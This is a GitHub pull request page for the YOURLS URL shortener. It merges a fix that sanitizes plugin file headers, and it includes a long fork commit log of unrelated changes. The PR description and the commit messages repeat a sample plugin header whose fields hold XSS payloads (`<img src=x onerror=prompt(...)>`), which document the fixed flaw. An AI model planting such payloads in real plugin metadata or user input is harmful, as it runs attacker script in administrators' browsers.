  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FYOURLS%2FYOURLS%2Fpull%2F2761)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=YOURLS%2FYOURLS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[YOURLS](/YOURLS)
/
**[YOURLS](/YOURLS/YOURLS)**
Public

* [Notifications](/login?return_to=%2FYOURLS%2FYOURLS) You must be signed in to change notification settings
* [Fork
  2k](/login?return_to=%2FYOURLS%2FYOURLS)
* [Star
   11k](/login?return_to=%2FYOURLS%2FYOURLS)

* [Code](/YOURLS/YOURLS)
* [Issues
  68](/YOURLS/YOURLS/issues)
* [Pull requests
  14](/YOURLS/YOURLS/pulls)
* [Discussions](/YOURLS/YOURLS/discussions)
* [Actions](/YOURLS/YOURLS/actions)
* [Security](/YOURLS/YOURLS/security)
* [Insights](/YOURLS/YOURLS/pulse)

Additional navigation options

* [Code](/YOURLS/YOURLS)
* [Issues](/YOURLS/YOURLS/issues)
* [Pull requests](/YOURLS/YOURLS/pulls)
* [Discussions](/YOURLS/YOURLS/discussions)
* [Actions](/YOURLS/YOURLS/actions)
* [Security](/YOURLS/YOURLS/security)
* [Insights](/YOURLS/YOURLS/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FYOURLS%2FYOURLS%2Fissues%2Fnew%2Fchoose)

By clicking âSign up for GitHubâ, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). Weâll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FYOURLS%2FYOURLS%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Sanitize plugin file header before display #2761

 Merged

[ozh](/ozh)
merged 1 commit into
[master](/YOURLS/YOURLS/tree/master "YOURLS/YOURLS:master")
from
[xss-header](/YOURLS/YOURLS/tree/xss-header "YOURLS/YOURLS:xss-header")

Oct 11, 2020

 Merged

# [Sanitize plugin file header before display](#top) #2761

[ozh](/ozh)
merged 1 commit into
[master](/YOURLS/YOURLS/tree/master "YOURLS/YOURLS:master")
from
[xss-header](/YOURLS/YOURLS/tree/xss-header "YOURLS/YOURLS:xss-header")

Oct 11, 2020

[Conversation
3](/YOURLS/YOURLS/pull/2761)
[Commits
1](/YOURLS/YOURLS/pull/2761/commits)
[Checks
0](/YOURLS/YOURLS/pull/2761/checks)
[Files changed](/YOURLS/YOURLS/pull/2761/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![ozh](https://avatars.githubusercontent.com/u/223647?s=60&v=4)](/ozh)

Copy link

Member

### @ozh **[ozh](/ozh)** commented [Oct 11, 2020](#issue-718815923) â¢ edited Loading

Avoid improbable case such as:

```
/**
 * Plugin Name: anything"><img src=x onerror=prompt("name")>
 * Plugin URI: anything"><img src=x onerror=prompt("")>
 * Description: anything"><img src=x onerror=prompt("desc")>
 * Version: anything"><img src=x onerror=prompt('version')>
 * Author: anything"><img src=x onerror=prompt('author')>
 * Author URI: anything"><img src=x onerror=prompt("desc")>
 */
```

Sorry, something went wrong.

 ð
3
 dgw, spwn3r49sd3r00, and johnjhacking reacted with thumbs up emoji

All reactions

* ð
  3 reactions

[![@ozh](https://avatars.githubusercontent.com/u/223647?s=40&v=4)](/ozh)

`[Sanitize plugin file header before display](/YOURLS/YOURLS/pull/2761/commits/93396c14587ece4f3d7bcb654f6d22eb0bae7d74 "Sanitize plugin file header before display

Avoid improbable case such as:

/**
 * Plugin Name: anything\"><img src=x onerror=prompt(\"name\")>
 * Plugin URI: anything\"><img src=x onerror=prompt(\"\")>
 * Description: anything\"><img src=x onerror=prompt(\"desc\")>
 * Version: anything\"><img src=x onerror=prompt('version')>
 * Author: anything\"><img src=x onerror=prompt('author')>
 * Author URI: anything\"><img src=x onerror=prompt(\"desc\")>
 */")`
 â¦

`[93396c1](/YOURLS/YOURLS/pull/2761/commits/93396c14587ece4f3d7bcb654f6d22eb0bae7d74)`

```
Avoid improbable case such as:

/**
 * Plugin Name: anything"><img src=x onerror=prompt("name")>
 * Plugin URI: anything"><img src=x onerror=prompt("")>
 * Description: anything"><img src=x onerror=prompt("desc")>
 * Version: anything"><img src=x onerror=prompt('version')>
 * Author: anything"><img src=x onerror=prompt('author')>
 * Author URI: anything"><img src=x onerror=prompt("desc")>
 */
```

[![@ozh](https://avatars.githubusercontent.com/u/223647?s=40&u=183927352c81b4b9e4c36bb52c28755cd920c522&v=4)](/ozh)
[ozh](/ozh)
merged commit [`04495e8`](/YOURLS/YOURLS/commit/04495e8b17ffeedb695ef5a64389f6bee15d57fb)
into
master

[Oct 11, 2020](https://github.com/YOURLS/YOURLS/pull/2761#event-3863600846)

 [![@ozh](https://avatars.githubusercontent.com/u/223647?s=40&u=183927352c81b4b9e4c36bb52c28755cd920c522&v=4)](/ozh)
[ozh](/ozh)
deleted the
xss-header

branch
[October 11, 2020 11:37](#event-3863600862)

[![@ozh](https://avatars.githubusercontent.com/u/223647?s=80&u=183927352c81b4b9e4c36bb52c28755cd920c522&v=4)](/ozh)

Copy link

Member

Author

### **[ozh](/ozh)** commented [Oct 11, 2020](#issuecomment-706695574)

| Credits : issue reported by John Jackson, <jjackson at johnjhacking.com> |
| --- |

All reactions

Sorry, something went wrong.

[![@spwn3r49sd3r00](https://avatars.githubusercontent.com/u/14950069?s=80&u=3b8316d2afec09d98744a838595a392c2fa7b8f1&v=4)](/spwn3r49sd3r00)

Copy link

### **[spwn3r49sd3r00](/spwn3r49sd3r00)** commented [Oct 11, 2020](#issuecomment-706744420)

| Awesome ð |
| --- |

All reactions

Sorry, something went wrong.

[![@johnjhacking](https://avatars.githubusercontent.com/u/39013067?s=80&u=0788ea90307936996f17445395d8962caf71b539&v=4)](/johnjhacking)

Copy link

### **[johnjhacking](/johnjhacking)** commented [Oct 11, 2020](#issuecomment-706754715)

| Also Credits: Lost Rabbit Labs <lostrabbitlabs.com> Shail Patel <@shail\_official on Twitter>  Thank you for fixing this so quickly. |
| --- |

All reactions

Sorry, something went wrong.

[iWantToKeepAnon](/iWantToKeepAnon)
added a commit
to iWantToKeepAnon/YOURLS
that referenced
this pull request
[Mar 7, 2023](#ref-commit-801382d)
[![@iWantToKeepAnon](https://avatars.githubusercontent.com/u/7583230?s=40&v=4)](/iWantToKeepAnon) [![@ozh](https://avatars.githubusercontent.com/u/223647?s=40&u=183927352c81b4b9e4c36bb52c28755cd920c522&v=4)](/ozh)
[![@LeoColomb](https://avatars.githubusercontent.com/u/846943?s=40&u=81226e70bc696d34fd9b570cfc8e7d990e4a5027&v=4)](/LeoColomb) [![@dagee3](https://avatars.githubusercontent.com/u/32556436?s=40&v=4)](/dagee3) [![@MarcProe](https://avatars.githubusercontent.com/u/11455452?s=40&u=48c90d3081ef778284c42e46c07a4d0af003ff75&v=4)](/MarcProe) [![@hangxingliu](https://avatars.githubusercontent.com/u/4303130?s=40&v=4)](/hangxingliu) [![@Art4](https://avatars.githubusercontent.com/u/2162994?s=40&u=9defb520c48ee74e70f5f5ef89fa03435923811e&v=4)](/Art4) [![@pcolmer](https://avatars.githubusercontent.com/u/1979931?s=40&u=cee316578178a499f76cc39a868b477e6f2a4e76&v=4)](/pcolmer) [![@muellerlukas](https://avatars.githubusercontent.com/u/5663690?s=40&u=13ab2d105f522a89465678fa92b66e1173ce87cd&v=4)](/muellerlukas) [![@audreymaniez](https://avatars.githubusercontent.com/u/409392?s=40&v=4)](/audreymaniez) [![@paulgoodchild](https://avatars.githubusercontent.com/u/10562196?s=40&u=1e767084a6a563b4ebc1678c6978cb3e2cab4f55&v=4)](/paulgoodchild) [![@mibe](https://avatars.githubusercontent.com/u/573529?s=40&v=4)](/mibe) [![@JeremyKeusters](https://avatars.githubusercontent.com/u/4648081?s=40&u=b73152f68a2061059abeb78bd17a7b632bd05ef8&v=4)](/JeremyKeusters) [![@s6fcda](https://avatars.githubusercontent.com/u/47492172?s=40&v=4)](/s6fcda) [![@IngoKl](https://avatars.githubusercontent.com/u/16179317?s=40&u=c1b456f9b4baf948a75f11aa440ae33ab143a362&v=4)](/IngoKl) [![@ueickmann](https://avatars.githubusercontent.com/u/45387393?s=40&v=4)](/ueickmann) [![@aaryanporwal](https://avatars.githubusercontent.com/u/54525904?s=40&u=ab42aaa98f9b019e7adcf8c4a2d21dbb8183c6d4&v=4)](/aaryanporwal) [![@hitjethva](https://avatars.githubusercontent.com/u/16317864?s=40&v=4)](/hitjethva) [![@dgw](https://avatars.githubusercontent.com/u/164140?s=40&u=84ec932c2bac7dceb62f6a0e73f3101a4ebad7b6&v=4)](/dgw) [![@flortsch](https://avatars.githubusercontent.com/u/15350076?s=40&u=cebea187a83b216b2756fc5cdac2c33ea9baff9b&v=4)](/flortsch) [![@zach2825](https://avatars.githubusercontent.com/u/4049321?s=40&u=694b5c96ea8c9446809fbdb7c98eb2a7c3afb448&v=4)](/zach2825) [![@LeoVie](https://avatars.githubusercontent.com/u/7249788?s=40&u=be8e8fa8ecf1fab32341e037bd866c6a1c95e3bf&v=4)](/LeoVie) [![@Bibo-Joshi](https://avatars.githubusercontent.com/u/22366557?s=40&u=9bf3dd22bc021d28924607ffef11efad2546f4de&v=4)](/Bibo-Joshi) [![@dogsbody](https://avatars.githubusercontent.com/u/131411?s=40&v=4)](/dogsbody) [![@simon-eller](https://avatars.githubusercontent.com/u/63782380?s=40&v=4)](/simon-eller) [![@LinuxStans](https://avatars.githubusercontent.com/u/78315004?s=40&v=4)](/LinuxStans) [![@JayHoltslander](https://avatars.githubusercontent.com/u/2069960?s=40&v=4)](/JayHoltslander) [![@kghbln](https://avatars.githubusercontent.com/u/1104078?s=40&u=3bb86baca2ce033784f17e2f96b935d715e5ae7b&v=4)](/kghbln) [![@jonathandhn](https://avatars.githubusercontent.com/u/55917666?s=40&u=1e48ec2df6ff8d111a4b7633de1bafe53b762c13&v=4)](/jonathandhn) [![@dependabot](https://avatars.githubusercontent.com/in/29110?s=40&v=4)](/apps/dependabot) [![@JensSpanier](https://avatars.githubusercontent.com/u/42373861?s=40&u=74533669a9ca65eddb1def9c59debc4fc404627a&v=4)](/JensSpanier) [![@dcfaber](https://avatars.githubusercontent.com/u/9099407?s=40&u=d6d96f5e1e6ae8210f4357a40a6a88362ae26392&v=4)](/dcfaber) [![@boedah](https://avatars.githubusercontent.com/u/1183125?s=40&u=e7a5d53d00eb2fb80b15429801809014c615c15e&v=4)](/boedah) [![@bryanpedini](https://avatars.githubusercontent.com/u/45012292?s=40&u=6cab70494170240a8f7b3eeb681ac411d0b27c66&v=4)](/bryanpedini) [![@umireon](https://avatars.githubusercontent.com/u/1067855?s=40&u=a9703949c35aeac81fba2e1b317870d1b25e30e9&v=4)](/umireon) [![@dan-r](https://avatars.githubusercontent.com/u/1384852?s=40&u=88ac539511f4430b4d78a1ef40898f71cb2186a4&v=4)](/dan-r) [![@jaas666](https://avatars.githubusercontent.com/u/30204147?s=40&u=2a45e1314e99034d63002a6ee462dfe38d5372d2&v=4)](/jaas666) [![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions) [![@yourls-bot](https://avatars.githubusercontent.com/in/192862?s=40&v=4)](/apps/yourls-bot) [![@barryhughes](https://avatars.githubusercontent.com/u/3594411?s=40&u=9b59ca2665d6d53460aa7e08c40d0d62c5735054&v=4)](/barryhughes) [![@nexxai](https://avatars.githubusercontent.com/u/4316564?s=40&u=53c2d8cbcecbcffb3f01b06a4eb219e657a07934&v=4)](/nexxai) [![@SXN31](https://avatars.githubusercontent.com/u/43016545?s=40&u=3256d366b6d9c7ffafc198867b8dc65a9c8fdf78&v=4)](/SXN31) [![@jarebear6expepjozn6rakjq5iczi3irqwphcvb](https://avatars.githubusercontent.com/u/1045813?s=40&v=4)](/jarebear6expepjozn6rakjq5iczi3irqwphcvb) [![@four-bytes-robby](https://avatars.githubusercontent.com/u/22675949?s=40&v=4)](/four-bytes-robby) [![@f1rf1n](https://avatars.githubusercontent.com/u/16431321?s=40&u=3d8743a215e94b2c5cfefe92a2937fd65bae10ec&v=4)](/f1rf1n)

`[Php81 update (](/iWantToKeepAnon/YOURLS/commit/801382d30b0232118703e19316c429ae02d43f81 "Php81 update (#2)

* deprecate Twitter :-(

See #2639 and https://git.io/Jvhw6 for more info

* Remove obsolete setting and link to wiki

[skip ci] [skip travis] [skip scrutinizer]

* Accept timestamped signature with arbitrary hash (#2644)

* Allow arbitrary hashed signatures
* Force timestamps to int
* Improve comment
* Test new feature and add more tests

* Truncate display of long IP

Ozh doing CSS. Yeah right. Fixes #2266

[skip travis] [skip ci] [skip scrutinizer]

* deprecate twitter (continued)

[skip travis] [skip scrutinizer] [skip ci]

* Update CHANGELOG.md

* Use SVG logo in lieu of the old PNG one (#2649)

Ahah. I love this expression, \"in lieu of\" :)
Also, remove those social buttons. I think they're useless and ugly.

* Update share links.

Closes #2554. [skip travis] [skip scrutinizer]

* Move /pages into /user (#2648)

Closes #1582

* Move `pages/` into `user/`
* Update functions to display pages
* Add tests for pages
* Update .gitignore and robots sample file

Co-authored-by:  LÃ©o Colombaro <git@colombaro.fr>

* Update contributors

I sometimes close pull requests yet use parts of the suggested code. In the
end it's a shame that original submitters are not given credit, so this
commit is just a sincere \"thank you\" to:
- @dagee3 for #2362
- @MarcProe for #2445
- @hangxingliu for #2545
- @Art4 for #2581
- @pcolmer / @philip-linaro for #2608
- @muellerlukas for #2554

Co-authored-by: Darrell Agee <dagee3@users.noreply.github.com>
Co-authored-by: Marcus <MarcProe@users.noreply.github.com>
Co-authored-by: Liu Yue <hangxingliu@gmail.com>
Co-authored-by: Artur Weigandt <Art4@users.noreply.github.com>
Co-authored-by: Philip Colmer <pcolmer@users.noreply.github.com>
Co-authored-by: Lukas MÃ¼ller <info@muellerlukas.de>

(hoping they'll show in the contributors list)

* Update contributors

I sometimes close pull requests yet use parts of the suggested code. In the
end it's a shame that original submitters are not given credit, so this
commit is just a sincere \"thank you\" to:
- @dagee3 for #2362
- @MarcProe for #2445
- @hangxingliu for #2545
- @Art4 for #2581
- @pcolmer / @philip-linaro for #2608
- @muellerlukas for #2554

(hoping they'll show in the contributors list)
[skip scrutinizer] [skip travis]

Co-authored-by: Darrell Agee <dagee3@users.noreply.github.com>
Co-authored-by: Marcus <MarcProe@users.noreply.github.com>
Co-authored-by: Liu Yue <hangxingliu@gmail.com>
Co-authored-by: Artur Weigandt <Art4@users.noreply.github.com>
Co-authored-by: Philip Colmer <pcolmer@users.noreply.github.com>
Co-authored-by: Lukas MÃ¼ller <info@muellerlukas.de>

* Add labels to every input on index page (#2650)

Props @audreymaniez
Closes #2300

Co-authored-by: Audrey Maniez <amaniez@access42.net>

* Always return trimmed (and filtered) YOURLS_SITE (#2653)

Closes #2651

* Reorganize .gitignore for readability

It was either too forgiving or too ignoring
[skip scrutinizer] [skip travis]

* Add missing translations (#2655)

Fixes #1666
Fixes #1598
Closes #1655

* Validate api.yourls.org result when checking for new version (#2657)

* Bump to 1.7.9

* Bump 1.7.10

* Forbid tests/

Fixes #2664

* Split functions.php in smaller files

New function files for:
* debug
* options
* links
* geo
* shorturls
Fixes #2654

* Regroup and always load auth functions
Fixes #2662
Fixes #2661

Co-authored-by: paulgoodchild <paulgoodchild@users.noreply.github.com>

* Readme tweak (#2671)

* Stop hotlinking images from yourls.org
* Linkable h2 & h3

* Gandi link

[skip travis] [skip scrutinizer]

* Allow 255 chars for the user agent (#2672)

* New/better hooks for referrer and user agent

* Update deps (#2676)

* Begin functions cleaning, starting with GEO. (#2670)

* cleanup geo functions
* add support for CloudFlare's Country GEO header without the need for IP resolution and database
* ensure flag URL always returns a string, instead of false on failure as the result is always used as a string (without validation)
* add helper yours_get_db() so we don't need to use \"global $ydb\" throughout and it ensures that ydb is always initialised correctly and hasn't ever been changed to something incompatible.
* simplify debug get log
* tidy up code and phpdocs for functions-plugins
* cleanup & phpdocs for parts of functions.php
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Smarter keyword sanitization (#2682)

* Smarter keyword sanitizing, based on context
* Deprecate yourls_sanitize_string()

Fixes #2646.
Fixes #2128.

* Update README.md

* Timezones (#2684)

* Implemented support for timezones
* Removed OFFSET const from config
* Localized yet sortable date in admin shorturl list
* Unit tests
* Code cleanup

Co-authored-by: JÃ©rÃ©my K <JeremyKeusters@users.noreply.github.com>

* More flexible plugin headers, and tests

* Correcting minor typo

* Revise yourls_date_i18n() (#2701)

* Revise yourls_date_i18n()
* Remove useless function
* Save one query on each call ð

Fixes #2694

* Reverse build script logic (#2705)

By default simply list what would go, but don't delete anything

* PHPUnit tweaks (#2706)

* Overwrite tests/composer.json with specific phpunit version depending on PHP version
* Send code coverage to scrutinize

* Update README

Actual links to contributing.md

* Readme tweaks

* Moar badges. I love badges.

* Clarify allowed chars in table names & prefixes (#2721)

Fixes #2720

* Fix typos

* Update sample plugin (#2737)

Remove all third party, deprecated or not. Fixes #2736.

* Extend filter-hook \"table_add_row_action_array\"

Closes #2743

* The mac client is deprecated (#2754)

The mac client is deprecated and the link is redirecting to other website (http://timi.im/app/) which looks malicious.

* Update readme.html (#2758)

Add YOURLS installation link for Ubuntu 20.04 version.

Co-authored-by: dgw <dgw@technobabbl.es>

* Fix that effing encoding problem (#2690)

This commit's changelog

- less encode/decode
- update jQuery & remove old ones
- No encoding in JS
- Also, 4 spaces in JS too, duh
- IDN domain functions
- Use mb_ functions to preverse IDN domains
- Support for UTF8MB4
- update install procedure
- update upgrade procedure. Note: The log table will be left untouched by the upgrade, it's impossible to make a convenient upgrade script for thousands of rows. The only problem will be if someone uses UTF8 short URLs (eg `http://sho.rt/Ã©Ã©ð©`)
- Handle normalization of IDN domains & tests
- Fix warning on 7.2 and 7.3
- Deal with encoding in bookmarklets
- Enclose upgrade queries in a transaction
- Force no caching upon install or upgrade. Note: Strange behavior: if YOURLS hosted on an IDN domain, browser (FF at least) caches the redirection from admin/index.php to admin/install.php
- Support for IDN YOURLS hosting
- Tests for IDN YOURLS hosting
- Fix code (that will never get run again)
- Don't cache ajax requests
- Remove unnecessary function call
- Add comment doc block
- More IDN sanitizing tests
- IDN : Screw the \"open dots\". Who's going to type domainãcom instead of domain.com anyway? Seriously. (although these do pass on my dev box)
- Deprecate yourls_lowercase_scheme_domain()
- Update doc to reflect DB change

* On logout, explicitely send to index.php

Fix logout link in admin panel.

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Sanitize plugin file header before display (#2761)

Avoid improbable case such as:

/**
 * Plugin Name: anything\"><img src=x onerror=prompt(\"name\")>
 * Plugin URI: anything\"><img src=x onerror=prompt(\"\")>
 * Description: anything\"><img src=x onerror=prompt(\"desc\")>
 * Version: anything\"><img src=x onerror=prompt('version')>
 * Author: anything\"><img src=x onerror=prompt('author')>
 * Author URI: anything\"><img src=x onerror=prompt(\"desc\")>
 */

* Remove `global $ydb` calls and prefer helper function (#2762)

Fixes #2698

Changes :
- Replace all global $ydb; and $ydb->... with yourls_get_db()-> in code and tests
- Add tests
- Introduce yourls_set_db()

* Replace `call_user_func()` with variable functions (#2763)

Fixes #2714

* Display default shorturls_length in the database if not already set (#2767)

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update XML lib for API output (#2770)

Will close #2668

* Add verifications for exception messages in tests (#2780)

* Add WhatsApp and Telegram Protocols (#2781)

* Fix typo broken in #2781 (#2786)

* Update clipboard.js to 2.0.6 (#2788)

Internal breaking change : js constructor from `new Clipboard()` to `new ClipboardJS()`

Signed-off-by: Aaron <admin@datahoarder.dev>

* optional `$title` param in `yourls_table_add_row()` can't be optional (#2808)

PHP 8.0 deprecated optional parameters before required ones:
https://php.watch/versions/8.0/deprecate-required-param-after-optional

All call sites in YOURLS already pass `$title` (because they have to),
so there's no reason it needs to be an optional argument. This change
resolves part of #2807.

Additionally, the first line of `yourls_table_add_row()` was indented
with spaces instead of using s tab character like the rest of the file.
This has been corrected as a bonus.

* Update tests matrix and setup

* Update travis for composer 2
* Update xdebug.mode in php.ini
* Bump PHPUnit versions for PHP 8 and nightly
* Remove 5.6

* Replace double quotes with single quotes, preventing fatal exception when running on MySQL 8 (#2800)

Fixes #2799

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update Travis badge

[skip ci] [skip travis]

* Update libs and fix PHP 8 (#2824)

Fixes #2807

* Update libs
* Refactor the logging system to match Aura SQL 3
* Bump PHPUnit version
* Downgrade spatie/array-to-xml to 2.15
* Upgrade expectations to PHPUnit 8+
* Drop PHPUnit 6 support

Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Move to GitHub Actions (#2828)

* Move to GitHub Actions
* Switch badges to GitHub Actions
* Add dependabot for github-actions actions

* SVG icons (#2822)

Co-authored-by: Ozh <ozh@ozh.org>

* Update readme.html (#2823)

Added a new detailed tutorial for LEMP+Let's Encrypt

* SVG logo and icon as designed by @JayHoltslander (#2837)

Co-authored-by: Jay Holtslander <j.holtslander@gmail.com>

* Disable 8.1  (#2838)

Disable 8.1 run as allow run failure not available

* Use short array syntax (#2839)

* Revert enclosing in transaction

Fixes #2827

* Fix collation in the update to current master (#2840)

* Fix collation in the update. Bump DB to 506.
* Fixes #2766

* Bump min PHP requirement (#2841)

* Readme cleanup (#2842)

Remove all unofficial links, now to be found on https://github.com/YOURLS/awesome-yourls

* 1.8, baby

* Update CHANGELOG.md

Adding 1.8 and 1.7.9 that was forgotten

* Add missing escapes characters to MySQL query in functions-upgrade.php (#2844)

* Bump shivammathur/setup-php from 2.9.0 to 2.10.0 (#2847)

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.9.0 to 2.10.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.9.0...fa18c2b29fb5bc1e52e8cf211aad2aaa9b79d232)

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Create labeler.yml

* Create label-commenter-config.yml

* Fix branch name in actions

* Update collation on install (#2846)

* Fix is_private overruling (#2859)

* Fix is_private overruling
* Simplify function yourls_is_private

* Support for 'all' hook (#2860)

* Improve inline doc & comments
* Introduce support for the 'all' hook
* Unit test nitpicking

* 1.8.1 changelog

[skip ci]

* Bump for 1.8.1

[skip ci]

* Fix SVG for IE 11 (#2864)

* Add viewBox attribute to favicon
* Logo missing viewBox as well

* Add a release workflow to dispatch to Docker repo

* Promote GitHub Discussions for community support

* Promote awesome-yourls

* Bump shivammathur/setup-php from 2.10.0 to 2.11.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.10.0 to 2.11.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.10.0...b0559f7f8eaf458ae85a7bb2f83b25d37211160e)

Signed-off-by: dependabot[bot] <support@github.com>

* Bump rmccue/requests from 1.7.0 to 1.8.0 (#2916)

Bumps [rmccue/requests](https://github.com/rmccue/Requests) from 1.7.0 to 1.8.0.
- [Release notes](https://github.com/rmccue/Requests/releases)
- [Changelog](https://github.com/WordPress/Requests/blob/master/CHANGELOG.md)
- [Commits](https://github.com/rmccue/Requests/compare/v1.7.0...v1.8.0)

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Refactor admin/index.php & more filters (#2912)

* Move some logic from admin/index.php to own class
* Comments & documentation

* Clarify what setting is for

Wiki page added: https://yourls.org/urlconvert
For the lolz, here are the values for this setting encountered in the wild: https://gist.github.com/ozh/46056801ee25b9f328334b3ce0e32f1b

[skip ci]

* Bump peter-evans/create-pull-request from 3 to 3.9.1

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3 to 3.9.1.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3...v3.9.1)

Signed-off-by: dependabot[bot] <support@github.com>

* Bump actions/checkout from 2 to 2.3.4

Bumps [actions/checkout](https://github.com/actions/checkout) from 2 to 2.3.4.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2...v2.3.4)

Signed-off-by: dependabot[bot] <support@github.com>

* Bump peaceiris/actions-label-commenter from 1 to 1.9.1

Bumps [peaceiris/actions-label-commenter](https://github.com/peaceiris/actions-label-commenter) from 1 to 1.9.1.
- [Release notes](https://github.com/peaceiris/actions-label-commenter/releases)
- [Changelog](https://github.com/peaceiris/actions-label-commenter/blob/main/CHANGELOG.md)
- [Commits](https://github.com/peaceiris/actions-label-commenter/compare/v1...v1.9.1)

Signed-off-by: dependabot[bot] <support@github.com>

* bugfix/db upgrade 506 (#2933)

* fix duplicate array key
* convert url table *after* changing field length to avoid \"key was too long; max key length is 767 bytes\" error on some DB setups

* Bump peter-evans/create-pull-request from 3.9.1 to 3.9.2 (#2942)

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.9.1 to 3.9.2.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.9.1...v3.9.2)

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump peter-evans/create-pull-request from 3.9.2 to 3.10.0

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.9.2 to 3.10.0.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.9.2...v3.10.0)

Signed-off-by: dependabot[bot] <support@github.com>

* Filter all HTTP request params (#2951)

* Add `version` to API usage

Closes #2957

[skip ci]

* Bump peaceiris/actions-label-commenter from 1.9.1 to 1.9.2 (#2980)

Bumps [peaceiris/actions-label-commenter](https://github.com/peaceiris/actions-label-commenter) from 1.9.1 to 1.9.2.
- [Release notes](https://github.com/peaceiris/actions-label-commenter/releases)
- [Changelog](https://github.com/peaceiris/actions-label-commenter/blob/main/CHANGELOG.md)
- [Commits](https://github.com/peaceiris/actions-label-commenter/compare/v1.9.1...v1.9.2)

---
updated-dependencies:
- dependency-name: peaceiris/actions-label-commenter
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump peaceiris/actions-label-commenter from 1.9.2 to 1.10.0

Bumps [peaceiris/actions-label-commenter](https://github.com/peaceiris/actions-label-commenter) from 1.9.2 to 1.10.0.
- [Release notes](https://github.com/peaceiris/actions-label-commenter/releases)
- [Changelog](https://github.com/peaceiris/actions-label-commenter/blob/main/CHANGELOG.md)
- [Commits](https://github.com/peaceiris/actions-label-commenter/compare/v1.9.2...v1.10.0)

---
updated-dependencies:
- dependency-name: peaceiris/actions-label-commenter
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.11.0 to 2.12.0 (#2996)

